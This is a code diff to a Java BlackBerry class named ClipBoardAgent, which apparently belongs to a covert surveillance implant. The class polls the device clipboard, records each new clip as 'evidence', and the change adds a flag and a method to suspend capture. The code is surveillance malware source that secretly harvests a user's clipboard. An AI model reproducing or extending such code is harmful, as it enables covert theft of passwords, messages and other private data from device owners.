@@ -32,6 +32,8 @@ public final class ClipBoardAgent extends Agent implements UserAgent {
 
     static String lastClip = "";
 
+    private boolean clipSuspended;
+
     /**
      * Instantiates a new clip board agent.
      * 
@@ -82,6 +84,9 @@ public final class ClipBoardAgent extends Agent implements UserAgent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public synchronized void actualRun() {
+        if(clipSuspended){
+            return;
+        }
         String clip = (String) Clipboard.getClipboard().get();
         if (clip != null) {
             if (!clip.equals(lastClip)) {
@@ -99,6 +104,7 @@ public final class ClipBoardAgent extends Agent implements UserAgent {
         debug.trace("setClip: " + clip);
         //#endif
         lastClip = clip;
+        clipSuspended = false;
     }
 
     /*
@@ -129,5 +135,9 @@ public final class ClipBoardAgent extends Agent implements UserAgent {
 
         evidence.atomicWriteOnce(items);
 
+    }
+
+    synchronized public void suspendClip() {
+        clipSuspended = true;
     }
 }
